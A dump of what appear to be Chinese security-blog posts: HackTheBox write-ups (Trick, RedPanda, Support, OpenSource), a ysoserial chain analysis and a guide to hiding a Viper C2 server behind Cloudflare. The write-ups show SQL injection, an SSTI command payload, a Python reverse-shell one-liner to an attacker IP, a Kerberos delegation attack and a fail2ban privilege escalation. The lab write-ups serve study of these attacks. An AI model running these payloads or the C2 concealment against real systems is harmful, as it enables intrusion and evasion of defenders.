hashCode() { int h = 0; Iterator\u003cEntry\u003cK,V\u003e\u003e i = entrySet().iterator();//HashMap类型 while (i.hasNext()) h += i.next().hashCode(); return h; } } public class HashMap\u003cK,V\u003e extends AbstractMap\u003cK,V\u003e implements Map\u003cK,V\u003e, Cloneable, Serializable { public final int hashCode() {//无法被继承 return Objects.hashCode(key) ^ Objects.hashCode(value); } } 调用链为LazyMap#hashCode-\u003eAbstractMapDecorator#hashCode-\u003eAbstractMap#hashCode-\u003eHashMap#hashCode 分析得知其哈希值为Objects.hashCode(\"yy\") ^ Objects.hashCode(1) = 3873和Objects.hashCode(\"zZ\") ^ Objects.hashCode(1) = 3873 e.key.equals(key)分析 对键进行比较,即调用lazyMap#equals方法,最终进入HashMap#equals方法 public class LazyMap extends AbstractMapDecorator implements Map, Serializable{} public abstract class AbstractMapDecorator implements Map { public boolean equals(Object object) { if (object == this) { return true; } return map.equals(object); } } public class HashMap\u003cK,V\u003e extends AbstractMap\u003cK,V\u003e implements Map\u003cK,V\u003e, Cloneable, Serializable { public final boolean equals(Object o) {}//无法被继承 } public abstract class AbstractMap\u003cK,V\u003e implements Map\u003cK,V\u003e { public boolean equals(Object o) { Map\u003c?,?\u003e m = (Map\u003c?,?\u003e) o; if (m.size() != size())//关键点 return false; try { Iterator\u003cEntry\u003cK,V\u003e\u003e i = entrySet().iterator(); while (i.hasNext()) { Entry\u003cK,V\u003e e = i.next(); K key = e.getKey(); V value = e.getValue(); if (value == null) { ... } else { if (!value.equals(m.get(key))) return false; } } } ... } } 在value.equals(m.get(key))中,m为LazyMap即调用LazyMap#get,后续流程与cc1一致 public Object get(Object key) { // create value for key if key is not currently in the map if (map.containsKey(key) == false) { Object value = factory.transform(key); map.put(key, value); return value; } return map.get(key); } 执行lazyMap2.remove(\"yy\");的原因 网上很多分析文章都说是要满足LazyMap#get方法中的map.containsKey(key) == false判断,因此要进行lazyMap2.remove(\"yy\"); 但实际上,在注释lazyMap2.remove(\"yy\");这行代码后,反序列化链将在AbstractMap#equals中止,因为不满足if (m.size() != size())而返回false m.size() = 2而size() = 1 ","date":"2022-10-10","objectID":"/ysoserial/:12:1","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["HackTheBox"],"content":"前期工作 nmap扫描结果 smtp可交互 SMTP 协议 25 端口渗透测试记录 试了一下,好像没有得到有价值的信息 wfuzz ./wfuzz -c -w /home/xxx/SecTools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.10.11.166 -H \"Host: FUZZ.trick.htb\" --hh 185 全都是200… DNS域传送 53端口处于开放状态,且存在服务 dig @10.10.11.166 -t axfr trick.htb 得到一个域名preprod-payroll.trick.htb 存在注入点 万能密码进入后台 后台看了一圈,没找到上传点,继续利用注入 得到users表中的数据 [*] , , 0, 1, Administrator, SuperGucciRainbowCake, 1, Enemigosss 用SuperGucciRainbowCake作为ssh密码失败 ","date":"2022-09-01","objectID":"/htb-trick/:1:0","tags":null,"title":"HackTheBox-Trick","uri":"/htb-trick/"},{"categories":["HackTheBox"],"content":"文件包含,分析源代码 重新分析网站,发现该网站切换页面的方式为index.php?page=xx,推测其切换方式为include($page.\".php\"); 传入index.php?page=php://filter/convert.base64-encode/resource=index成功读取到index.php的源代码 index.php ... \u003c?php session_start(); if(!isset($_SESSION['login_id'])) header('location:login.php'); include('./header.php'); // include('./auth.php'); ?\u003e ... login.php ... \u003c?php include('./header.php'); ?\u003e \u003c?php include('./db_connect.php'); ?\u003e \u003c?php session_start(); if(isset($_SESSION['login_id'])) header(\"location:index.php?page=home\"); ?\u003e ... \u003cscript\u003e $('#login-form').submit(function(e){ e.preventDefault() $('#login-form button[type=\"button\"]').attr('disabled',true).html('Logging in...'); if($(this).find('.alert-danger').length \u003e 0 ) $(this).find('.alert-danger').remove(); $.ajax({ url:'ajax.php?action=login', method:'POST', data:$(this).serialize(), error:err=\u003e{ console.log(err) $('#login-form button[type=\"button\"]').removeAttr('disabled').html('Login'); }, success:function(resp){ if(resp == 1){ location.href ='index.php?page=home'; }else if(resp == 2){ location.href ='voting.php'; }else{ $('#login-form').prepend('\u003cdiv class=\"alert alert-danger\"\u003eUsername or password is incorrect.\u003c/div\u003e') $('#login-form button[type=\"button\"]').removeAttr('disabled').html('Login'); } } }) }) \u003c/script\u003e ajax.php \u003c?php ob_start(); $action = $_GET['action']; include 'admin_class.php'; $crud = new Action(); if($action == 'login'){ $login = $crud-\u003elogin(); if($login) echo $login; } if($action == 'login2'){ $login = $crud-\u003elogin2(); if($login) echo $login; } if($action == 'logout'){ $logout = $crud-\u003elogout(); if($logout) echo $logout; } if($action == 'logout2'){ $logout = $crud-\u003elogout2(); if($logout) echo $logout; } if($action == 'save_user'){ $save = $crud-\u003esave_user(); if($save) echo $save; } if($action == 'delete_user'){ $save = $crud-\u003edelete_user(); if($save) echo $save; } if($action == 'signup'){ $save = $crud-\u003esignup(); if($save) echo $save; } if($action == \"save_settings\"){ $save = $crud-\u003esave_settings(); if($save) echo $save; } ... if($action == \"save_position\"){ $save = $crud-\u003esave_position(); if($save) echo $save; } ... admin_class.php \u003c?php session_start(); ini_set('display_errors', 1); Class Action { private $db; public function __construct() { ob_start(); include 'db_connect.php'; $this-\u003edb = $conn; } function __destruct() { $this-\u003edb-\u003eclose(); ob_end_flush(); } function login(){ extract($_POST); $qry = $this-\u003edb-\u003equery(\"SELECT * FROM users where username = '\".$username.\"' and password = '\".$password.\"' \"); if($qry-\u003enum_rows \u003e 0){ foreach ($qry-\u003efetch_array() as $key =\u003e $value) { if($key != 'passwors' \u0026\u0026 !is_numeric($key)) $_SESSION['login_'.$key] = $value; } return 1; }else{ return 3; } } function login2(){ extract($_POST); $qry = $this-\u003edb-\u003equery(\"SELECT * FROM users where username = '\".$email.\"' and password = '\".md5($password).\"' \"); if($qry-\u003enum_rows \u003e 0){ foreach ($qry-\u003efetch_array() as $key =\u003e $value) { if($key != 'passwors' \u0026\u0026 !is_numeric($key)) $_SESSION['login_'.$key] = $value; } return 1; }else{ return 3; } } function logout(){ session_destroy(); foreach ($_SESSION as $key =\u003e $value) { unset($_SESSION[$key]); } header(\"location:login.php\"); } function logout2(){ session_destroy(); foreach ($_SESSION as $key =\u003e $value) { unset($_SESSION[$key]); } header(\"location:../index.php\"); } function save_user(){ ... } function signup(){ ... } function save_settings(){//文件上传 extract($_POST); $data = \" name = '\".str_replace(\"'\",\"\u0026#x2019;\",$name).\"' \"; $data .= \", email = '$email' \"; $data .= \", contact = '$contact' \"; $data .= \", about_content = '\".htmlentities(str_replace(\"'\",\"\u0026#x2019;\",$about)).\"' \"; if($_FILES['img']['tmp_name'] != ''){ $fname = strtotime(date('y-m-d H:i')).'_'.$_FILES['img']['name']; $move = move_uploaded_file($_FILES['img']['tmp_name'],'assets/img/'. $fname); $data .= \", cover_img = '$fname' \"; } // echo \"INSERT INTO system_settings set \".$data; $chk = $this-\u003edb-\u003equery(\"SELECT * FROM system_settings\"); if($chk-\u003enum_rows \u003e 0){ $save = $this-\u003edb-\u003equery(\"U","date":"2022-09-01","objectID":"/htb-trick/:2:0","tags":null,"title":"HackTheBox-Trick","uri":"/htb-trick/"},{"categories":["HackTheBox"],"content":"分析其他站点 爆破/var/www/xxx/index.php,字典使用SecLists/Discovery/DNS/subdomains-top1million-5000.txt 存在另一个网站路径market,结合/var/www/payroll/index和preprod-payroll.trick.htb推测域名为preprod-market.trick.htb或者market.trick.htb,但是修改hosts后发现这两个域名与直接用ip访问没有区别 /var/www/market/index.php \u003c?php $file = $_GET['page']; if(!isset($file) || ($file==\"index.php\")) { include(\"/var/www/market/home.html\"); } else{ include(\"/var/www/market/\".str_replace(\"../\",\"\",$file)); } ?\u003e 问题来了,同样都是使用page参数,假如用payroll/index.php去包含market/index.php会导致market/index.php使用相同的page参数,那就白给了… 去breached.to看了一下老哥们的讨论,发现写进hosts中的域名是preprod-marketing.trick.htb(无语… 得到新的用户名michael 用michael作为用户名测试了一下上面的密码链接ssh,发现还是不行 ","date":"2022-09-01","objectID":"/htb-trick/:3:0","tags":null,"title":"HackTheBox-Trick","uri":"/htb-trick/"},{"categories":["HackTheBox"],"content":"获取user权限 可以读取id_rsa ","date":"2022-09-01","objectID":"/htb-trick/:4:0","tags":null,"title":"HackTheBox-Trick","uri":"/htb-trick/"},{"categories":["HackTheBox"],"content":"获取root权限 sudo -l显示可以用root身份执行/etc/init.d/fail2ban restart 参考文章 Privilege Escalation with fail2ban nopasswd Privilege Escalation via fail2ban find /etc/ -writable -ls 尝试直接修改iptables-multiport.conf,发现权限不足 michael@trick:/etc/fail2ban/action.d$ mv iptables-multiport.conf iptables-multiport.conf.bak michael@trick:/etc/fail2ban/action.d$ cp iptables-multiport.conf.bak iptables-multiport.conf michael@trick:/etc/fail2ban/action.d$ ls -alh iptables-multiport.conf -rw-r--r-- 1 michael michael 1.4K Sep 1 05:11 iptables-multiport.conf 将封禁的action替换chmod u+s /usr/bin/bash 后台使用nmap -p 22 --script=ssh-brute --script-args userdb=2.txt,passdb=1.txt 10.10.11.166对ssh进行爆破 对于-p参数的解释 -p Turned on whenever the real and effective user ids do not match. Disables processing of the $ENV file and importing of shell functions. Turning this option off causes the effective uid and gid to be set to the real uid and gid. 当真实有效的用户 id 不匹配时打开。禁用 $ENV 文件的处理和 shell 函数的导入。 关闭此选项会使有效的 uid 和 gid 设置为真实的 uid 和 gid。 ","date":"2022-09-01","objectID":"/htb-trick/:5:0","tags":null,"title":"HackTheBox-Trick","uri":"/htb-trick/"},{"categories":["HackTheBox"],"content":"前期工作 nmap扫描结果 ","date":"2022-08-29","objectID":"/htb-redpanda/:1:0","tags":null,"title":"HackTheBox-RedPanda","uri":"/htb-redpanda/"},{"categories":["HackTheBox"],"content":"模板注入,获取user权限 题目提示injection,推测为sql注入或者是模板注入 在测试时发现%被过滤,因此进行fuzz操作,发现%_$~被过滤 同时发现请求/favicon.ico时返回404json且网页标题提示为Spring Boot,结合过滤的内容,推测为Spring Boot模板注入 一顿操作后,得到模板注入为*{{xxx}} 利用name=*{{new+java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"sleep+5\").getInputStream()).next()}}成功执行命令 直接反弹好像会出问题,把反弹shell命令写成脚本传到服务器上再进行反弹 ","date":"2022-08-29","objectID":"/htb-redpanda/:2:0","tags":null,"title":"HackTheBox-RedPanda","uri":"/htb-redpanda/"},{"categories":["HackTheBox"],"content":"获取root权限 find / -user root -perm -4000 -print 2\u003e/dev/null没发现可以利用的点 pspy监控如下 /opt/cleanup.sh #!/bin/bash /usr/bin/find /tmp -name \"*.xml\" -exec rm -rf {} \\; /usr/bin/find /var/tmp -name \"*.xml\" -exec rm -rf {} \\; /usr/bin/find /dev/shm -name \"*.xml\" -exec rm -rf {} \\; /usr/bin/find /home/woodenk -name \"*.xml\" -exec rm -rf {} \\; /usr/bin/find /tmp -name \"*.jpg\" -exec rm -rf {} \\; /usr/bin/find /var/tmp -name \"*.jpg\" -exec rm -rf {} \\; /usr/bin/find /dev/shm -name \"*.jpg\" -exec rm -rf {} \\; /usr/bin/find /home/woodenk -name \"*.jpg\" -exec rm -rf {} \\; /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar // // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.logparser; import com.drew.imaging.jpeg.JpegMetadataReader; import com.drew.imaging.jpeg.JpegProcessingException; import com.drew.metadata.Directory; import com.drew.metadata.Metadata; import com.drew.metadata.Tag; import java.io.BufferedWriter; import java.io.File; import java.io.FileWriter; import java.io.IOException; import java.util.HashMap; import java.util.Iterator; import java.util.Map; import java.util.Scanner; import org.jdom2.Document; import org.jdom2.Element; import org.jdom2.JDOMException; import org.jdom2.input.SAXBuilder; import org.jdom2.output.Format; import org.jdom2.output.XMLOutputter; public class App { public App() { } public static Map parseLog(String line) { String[] strings = line.split(\"\\\\|\\\\|\"); Map map = new HashMap(); map.put(\"status_code\", Integer.parseInt(strings[0])); map.put(\"ip\", strings[1]); map.put(\"user_agent\", strings[2]); map.put(\"uri\", strings[3]); return map; } public static boolean isImage(String filename) { return filename.contains(\".jpg\"); } public static String getArtist(String uri) throws IOException, JpegProcessingException { String fullpath = \"/opt/panda_search/src/main/resources/static\" + uri;//目录穿越,注意这里没有使用/进行闭合 File jpgFile = new File(fullpath); Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);//文件必须为jpg Iterator var4 = metadata.getDirectories().iterator(); while(var4.hasNext()) { Directory dir = (Directory)var4.next(); Iterator var6 = dir.getTags().iterator(); while(var6.hasNext()) { Tag tag = (Tag)var6.next(); if (tag.getTagName() == \"Artist\") {//利用exiftools构建图片,手动指定Artist的值 return tag.getDescription(); } } } return \"N/A\"; } public static void addViewTo(String path, String uri) throws JDOMException, IOException { SAXBuilder saxBuilder = new SAXBuilder();//SAXBuilder如果使用默认配置就会触发XXE漏洞 XMLOutputter xmlOutput = new XMLOutputter(); xmlOutput.setFormat(Format.getPrettyFormat()); File fd = new File(path); Document doc = saxBuilder.build(fd); Element rootElement = doc.getRootElement(); Iterator var7 = rootElement.getChildren().iterator(); while(var7.hasNext()) { Element el = (Element)var7.next(); if (el.getName() == \"image\" \u0026\u0026 el.getChild(\"uri\").getText().equals(uri)) {//存在image项且uri与传入的uri相同 Integer totalviews = Integer.parseInt(rootElement.getChild(\"totalviews\").getText()) + 1; System.out.println(\"Total views:\" + Integer.toString(totalviews)); rootElement.getChild(\"totalviews\").setText(Integer.toString(totalviews)); Integer views = Integer.parseInt(el.getChild(\"views\").getText()); el.getChild(\"views\").setText(Integer.toString(views + 1)); } } BufferedWriter writer = new BufferedWriter(new FileWriter(fd)); xmlOutput.output(doc, writer); } public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException { File log_fd = new File(\"/opt/panda_search/redpanda.log\"); Scanner log_reader = new Scanner(log_fd); while(log_reader.hasNextLine()) { String line = log_reader.nextLine(); if (isImage(line)) {//isImage(line) 这一行中包含 .jpg Map parsed_data = parseLog(line); System.out.println(parsed_data.get(\"uri\")); String artist = getArtist(parsed_data.get(\"uri\").toString());//artist可控 System.out.println(\"Artist: \" + artist); String xmlPath = \"/credits/\" + artist + \"_creds.xml\"; addViewTo(xmlPath, parsed_data.get(\"uri\").toS","date":"2022-08-29","objectID":"/htb-redpanda/:3:0","tags":null,"title":"HackTheBox-RedPanda","uri":"/htb-redpanda/"},{"categories":["HackTheBox"],"content":"前期工作 nmap扫描结果 goby扫描结果 ","date":"2022-08-29","objectID":"/htb-support/:1:0","tags":null,"title":"HackTheBox-Support","uri":"/htb-support/"},{"categories":["HackTheBox"],"content":"前期工作 LDAP NULL bind匿名绑定导致登录绕过漏洞 import ldap ldapconn = ldap.initialize('ldap://10.10.11.174:389') ldapconn.simple_bind_s('', '') print(\"hello\") smb未授权访问 smbclient -N -L 10.10.11.174 只有//10.10.11.174/support-tools可以访问 用dnspy进行逆向 // UserInfo.Services.Protected // Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318 public static string getPassword() { byte[] array = Convert.FromBase64String(Protected.enc_password); byte[] array2 = array; for (int i = 0; i \u003c array.Length; i++) { array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223); } return Encoding.Default.GetString(array2); } // UserInfo.Services.Protected // Token: 0x06000011 RID: 17 RVA: 0x00002170 File Offset: 0x00000370 // Note: this type is marked as 'beforefieldinit'. static Protected() { Protected.enc_password = \"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E\"; Protected.key = Encoding.ASCII.GetBytes(\"armando\"); } import base64 enc_password = \"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E\" key = \"armando\" b64_password=base64.b64decode(enc_password) password=\"\" for i in range(len(b64_password)): password+=chr((b64_password[i]^ord(key[i%len(key)]))^223) print(password) 得到nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 作为ldap的密码试了这5个好像都不对??? ","date":"2022-08-29","objectID":"/htb-support/:2:0","tags":null,"title":"HackTheBox-Support","uri":"/htb-support/"},{"categories":["HackTheBox"],"content":"获取user权限 重新看了一下dnspy,发现了一个ladpquery public LdapQuery() { string password = Protected.getPassword(); this.entry = new DirectoryEntry(\"LDAP://support.htb\", \"support\\\\ldap\", password); this.entry.AuthenticationType = AuthenticationTypes.Secure; this.ds = new DirectorySearcher(this.entry); } 去https://devconnected.com/how-to-search-ldap-using-ldapsearch-examples/学了一下怎样用ldapsearch进行搜索 ldapsearch -H LDAP://support.htb -D support\\\\ldap -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b \"DC=support,DC=htb\" 列出所有用户名 ldapsearch -H LDAP://support.htb -D support\\\\ldap -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b \"CN=Users,DC=support,DC=htb\" \"name=*\" | grep \"name:\" name: Users name: krbtgt name: Domain Computers name: Domain Controllers name: Schema Admins name: Enterprise Admins name: Cert Publishers name: Domain Admins name: Domain Users name: Domain Guests name: Group Policy Creator Owners name: RAS and IAS Servers name: Allowed RODC Password Replication Group name: Denied RODC Password Replication Group name: Read-only Domain Controllers name: Enterprise Read-only Domain Controllers name: Cloneable Domain Controllers name: Protected Users name: Key Admins name: Enterprise Key Admins name: DnsAdmins name: DnsUpdateProxy name: Shared Support Accounts name: ldap name: support name: smith.rosario name: hernandez.stanley name: wilson.shelby name: anderson.damian name: thomas.raphael name: levine.leopoldo name: raven.clifton name: bardot.mary name: cromwell.gerard name: monroe.david name: west.laura name: langley.lucy name: daughtler.mabel name: stoll.rachelle name: ford.victoria name: Administrator name: Guest 发现在name=support时会多出一个info项 Ironside47pleasure40Watchful goby显示5985端口上存在http服务,推测为winrm,尝试进行攻击 一开始用pywinrm去调用发现抛出winrm.exceptions.InvalidCredentialsError错误… 用https://github.com/Hackplayers/evil-winrm进行攻击 建议用Docker版 ./evil-winrm.rb -i 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful' CS上个线 提权暂时没有思路… ","date":"2022-08-29","objectID":"/htb-support/:3:0","tags":null,"title":"HackTheBox-Support","uri":"/htb-support/"},{"categories":["HackTheBox"],"content":"获取root权限 Kerberos委派攻击 https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution https://xz.aliyun.com/t/7217 如果您对该计算机的 AD 对象具有 WRITE 权限，则可以在远程计算机上以提升的权限获得代码执行。 域控制器名称dc.support.htb 加载PowerView.ps1,在LSTAR/scripts/InfoCollect里面 加载Powermad.ps1 New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose Get-DomainComputer FAKE01 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5101)\" $SDBytes = New-Object byte[] ($SD.BinaryLength) $SD.GetBinaryForm($SDBytes, 0) Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose 从https://github.com/r3motecontrol/Ghostpack-CompiledBinaries获取Rubeus.exe .\\Rubeus.exe hash /password:123456 /user:FAKE01 /domain:offense.local [*] Input password : 123456 [*] Input username : FAKE01 [*] Input domain : offense.local [*] Salt : OFFENSE.LOCALFAKE01 [*] rc4_hmac : 32ED87BDB5FDC5E9CBA88547376818D4 [*] aes128_cts_hmac_sha1 : 3D33480EFAE7A9D3CEFCF2809D6B1721 [*] aes256_cts_hmac_sha1 : C3178E04A2D3587512B72838F32FABC7735FE78B7AC0CCC3787E78F614024451 [*] des_cbc_md5 : FDF1D320C28C750E 但是在.\\Rubeus.exe s4u /user:FAKE01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:spotless /msdsspn:cifs/dc.offense.local /ptt这一步卡住了… 用impacket/examples中的getST.py python3 getST.py support.htb/FAKE01:123456 -dc-ip 10.10.11.174 -impersonate administrator -spn www/dc.support.htb https://xz.aliyun.com/t/8665#toc-5 使用获取到的ccache 捋下思路 通过nmap和goby发现开放445和5985端口 通过smbclient读取到一个压缩包,对其中的userinfo.exe进行逆向,得到一个ldap的密码 利用该密码进行ldapsearch,列出CN=Users,DC=support,DC=htb并进行分析,在name=support时得到一个info 利用得到的info作为密码成功登入winrm 进行约束委派,在域中创建一个新的对象,并更新属性msDS-AllowedToActOnBehalfOfOtherIdentity,使其能够冒充域用户(包括管理员) 用impacket系列的getST请求administrator的TGT得到administrator.ccache,并利用该ccache冒充管理员成功利用wimexec登录系统 ","date":"2022-08-29","objectID":"/htb-support/:4:0","tags":null,"title":"HackTheBox-Support","uri":"/htb-support/"},{"categories":["HackTheBox"],"content":"前期工作 nmap 扫描结果 在download处可以下载到源代码,发现其存在.git文件夹 存在两个分支dev和public 通过比较分支,发现app/.vscode/setting.json { \"python.pythonPath\": \"/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python\", \"http.proxy\": \"http://dev01:Soulless_Developer#2022@10.10.10.128:5187/\", \"http.proxyStrictSSL\": false } 分析源代码view.py和utils.py import os from app.utils import get_file_name from flask import render_template, request, send_file from app import app @app.route('/', methods=['GET', 'POST']) def upload_file(): if request.method == 'POST': f = request.files['file'] file_name = get_file_name(f.filename) file_path = os.path.join(os.getcwd(), \"public\", \"uploads\", file_name) f.save(file_path) return render_template('success.html', file_url=request.host_url + \"uploads/\" + file_name) return render_template('upload.html') @app.route('/uploads/\u003cpath:path\u003e') def send_report(path): path = get_file_name(path) return send_file(os.path.join(os.getcwd(), \"public\", \"uploads\", path)) import time def current_milli_time(): return round(time.time() * 1000) \"\"\" Pass filename and return a secure version, which can then safely be stored on a regular file system. \"\"\" def get_file_name(unsafe_filename): return recursive_replace(unsafe_filename, \"../\", \"\") \"\"\" TODO: get unique filename \"\"\" def get_unique_upload_name(unsafe_filename): spl = unsafe_filename.rsplit(\"\\\\.\", 1) file_name = spl[0] file_extension = spl[1] return recursive_replace(file_name, \"../\", \"\") + \"_\" + str(current_milli_time()) + \".\" + file_extension \"\"\" Recursively replace a pattern in a string \"\"\" def recursive_replace(search, replace_me, with_me): if replace_me not in search: return search return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me) 在send_report函数中,虽然对../进行了过滤,但是由于os.path.join的存在,可以进行目录遍历和任意文件读取 当os.path.join调用遇到绝对路径时,它会忽略在该点之前遇到的所有参数并开始使用新的绝对路径,当参数可控时,我们控制恶意参数输入绝对路径,可能产生目录遍历 发现其开启了flask的debug模式,利用任意文件读取可以对flask的pin码进行破解 ","date":"2022-08-28","objectID":"/htb-opensource/:1:0","tags":null,"title":"HackTheBox-OpenSource","uri":"/htb-opensource/"},{"categories":["HackTheBox"],"content":"破解pin码,获取user权限 Flask pin码破解 https://raw.githubusercontent.com/wdahlenburg/werkzeug-debug-console-bypass/main/werkzeug-pin-bypass.py #!/bin/python3 import hashlib from itertools import chain probably_public_bits = [ 'root',# username 'flask.app',# modname 'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None), ] private_bits = [ '2485377892354',# str(uuid.getnode()), /sys/class/net/ens33/address /sys/class/net/eth0/address 将16进制转换成10进制 # Machine Id: /etc/machine-id(部分linux系统可能没有,直接忽略即可) + /proc/sys/kernel/random/boot_id + /proc/self/cgroup '1222106c-51fc-4deb-bc76-3a0e8123ecd75e5fb2cb3c55faf7ef369518259de66b251fa02647e1dca9db0b943d6f8c4235' ] h = hashlib.sha1() # Newer versions of Werkzeug use SHA1 instead of MD5 for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') cookie_name = '__wzd' + h.hexdigest()[:20] num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv = None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num print(\"Pin: \" + rv) import os,pty,socket;s=socket.socket();s.connect((\"10.10.16.8\",7000));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\") 构建frp [common] server_addr = 10.10.16.8 server_port = 7777 [s5] type = tcp plugin = socks5 remote_port = 6000 发现在http://172.17.0.1:3000/存在一个Gitea页面 利用dev01:Soulless_Developer#2022进行登录 在home-backup/.ssh/id_rsa中得到一个ssh私钥 ","date":"2022-08-28","objectID":"/htb-opensource/:2:0","tags":null,"title":"HackTheBox-OpenSource","uri":"/htb-opensource/"},{"categories":["HackTheBox"],"content":"获取root权限 直接提权不行,用find / -user root -perm -4000 -print 2\u003e/dev/null也没找到可以利用的点 上个pspy看进程监控 2022/08/27 06:53:01 CMD: UID=0 PID=5168 | /bin/sh -c /usr/local/bin/git-sync 2022/08/27 06:53:01 CMD: UID=0 PID=5167 | /bin/sh -c /usr/local/bin/git-sync 2022/08/27 06:53:01 CMD: UID=0 PID=5166 | /usr/sbin/CRON -f 2022/08/27 06:53:01 CMD: UID=0 PID=5169 | git status --porcelain 2022/08/27 06:53:01 CMD: UID=??? PID=5171 | ??? 2022/08/27 06:53:01 CMD: UID=0 PID=5172 | git commit -m Backup for 2022-08-27 2022/08/27 06:53:01 CMD: UID=0 PID=5173 | git push origin main 2022/08/27 06:53:01 CMD: UID=0 PID=5174 | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git 2022/08/27 06:54:01 CMD: UID=0 PID=5182 | /bin/sh -c /root/meta/app/clean.sh 2022/08/27 06:54:01 CMD: UID=0 PID=5181 | /bin/sh -c cp /root/config /home/dev01/.git/config 2022/08/27 06:54:01 CMD: UID=0 PID=5180 | /usr/sbin/CRON -f 2022/08/27 06:54:01 CMD: UID=0 PID=5179 | /usr/sbin/CRON -f 2022/08/27 06:54:01 CMD: UID=0 PID=5178 | /usr/sbin/CRON -f 2022/08/27 06:54:01 CMD: UID=0 PID=5177 | /usr/sbin/CRON -f 2022/08/27 06:54:01 CMD: UID=0 PID=5183 | /bin/bash /root/meta/app/clean.sh 2022/08/27 06:54:01 CMD: UID=0 PID=5184 | /bin/sh -c /usr/local/bin/git-sync 2022/08/27 06:54:01 CMD: UID=0 PID=5187 | /bin/bash /root/meta/app/clean.sh 2022/08/27 06:54:01 CMD: UID=0 PID=5186 | git status --porcelain 2022/08/27 06:54:01 CMD: UID=0 PID=5189 | /bin/bash /root/meta/app/clean.sh 2022/08/27 06:54:01 CMD: UID=0 PID=5188 | /bin/bash /root/meta/app/clean.sh 2022/08/27 06:54:01 CMD: UID=0 PID=5190 | date +%Y-%m-%d 2022/08/27 06:54:01 CMD: UID=0 PID=5191 | /bin/bash /usr/local/bin/git-sync 2022/08/27 06:54:01 CMD: UID=0 PID=5192 | /bin/bash /usr/local/bin/git-sync 2022/08/27 06:54:01 CMD: UID=0 PID=5193 | git push origin main 2022/08/27 06:54:01 CMD: UID=0 PID=5199 | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git 2022/08/27 06:54:01 CMD: UID=0 PID=5221 | /lib/systemd/systemd-udevd 以root权限运行/usr/local/bin/git-sync #!/bin/bash cd /home/dev01/ if ! git status --porcelain; then echo \"No changes\" else day=$(date +'%Y-%m-%d') echo \"Changes detected, pushing..\" git add . git commit -m \"Backup for ${day}\" git push origin main fi 利用git hooks以root身份进行命令执行 手写 git hooks 脚本（pre-commit、commit-msg） 记得给pre-commit加权限 ","date":"2022-08-28","objectID":"/htb-opensource/:3:0","tags":null,"title":"HackTheBox-OpenSource","uri":"/htb-opensource/"},{"categories":["红队/提权/域渗透"],"content":"基础配置 安装手册-首次安装 由于Viper的后台端口是在60000,绝大部分CDN不支持加速这个端口,因此容易导致C2服务器地址泄露 但是我们可以利用Cloudflared对Viper进行隐藏,参考使用Cloudflare Argo隐藏VIPER后台 docker ps docker exec -it xxx /bin/bash #下面是在容器内的操作 cd /root/viper/Docker/ nano viper.conf ssl on修改为ssl off nginx -s reload exit 下载并安装cloudflared后 cloudflared tunnel login cloudflared tunnel create tunnelname cloudflared tunnel route dns tunnelname tunnelname cloudflared tunnel --name tunnelname --url http://127.0.0.1:port 以viper为例则是 cloudflared tunnel login cloudflared tunnel create viper cloudflared tunnel route dns viper viper cloudflared tunnel --name viper --url http://127.0.0.1:60000 此时cloudflare会自动在example.com中添加viper的CNAME条目 访问viper.example.com即可打开viper的后台,测试无误后即可进行持久化处理 nano /etc/cloudflared/config.yml tunnel: tunnelid credentials-file: /root/.cloudflared/tunnelid.json ingress: - hostname: viper.example.com service: http://127.0.0.1:60000 - service: http_status:404 cloudflared service install systemctl restart cloudflared systemctl enable cloudflared ","date":"2022-07-19","objectID":"/viper%E5%88%9D%E4%BD%93%E9%AA%8C/:1:0","tags":null,"title":"Viper","uri":"/viper%E5%88%9D%E4%BD%93%E9%AA%8C/"},{"categories":["红队/提权/域渗透"],"content":"meterpreter/reverse_tcp上线 跟普通的msf上线过程一致 ","date":"2022-07-19","objectID":"/viper%E5%88%9D%E4%BD%93%E9%AA%8C/:2:0","tags":null,"title":"Viper","uri":"/viper%E5%88%9D%E4%BD%93%E9%AA%8C/"},{"categories":["红队/提权/域渗透"],"content":"http上线 同样参考msf http使用cloudflare argo上线,但是这篇文章中的方法无法复现,下面给出我的方法 假设msf监听6000端口,修改/etc/cloudflared/config.yml为 tunnel: tunnelid credentials-file: /root/.cloudflared/tunnelid.json ingress: - hostname: viper.example.com service: 